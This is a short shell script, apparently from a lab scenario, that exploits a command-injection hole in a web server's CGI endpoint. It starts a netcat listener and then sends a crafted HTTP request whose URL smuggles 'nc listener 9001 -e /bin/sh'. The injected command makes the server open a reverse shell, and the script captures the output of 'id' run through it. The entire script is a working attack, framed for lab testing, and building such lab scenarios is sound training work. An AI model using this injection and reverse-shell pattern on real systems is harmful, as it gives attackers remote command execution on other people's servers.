#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Lab use only. Runs inside the scenario's target pod.
# The listener sends two commands to whatever connects, then the web server
# is made to connect a shell to it through its vulnerable endpoint.
(printf 'id\nexit\n' | nc -l -p 9001 >/tmp/shell-output 2>&1 &)
sleep 1
(printf 'GET /cgi-bin/run?nc%%20listener%%209001%%20-e%%20/bin/sh HTTP/1.0\r\n\r\n' | nc web 8080 >/dev/null 2>&1 &)
sleep 4
echo "shell said: $(cat /tmp/shell-output)"
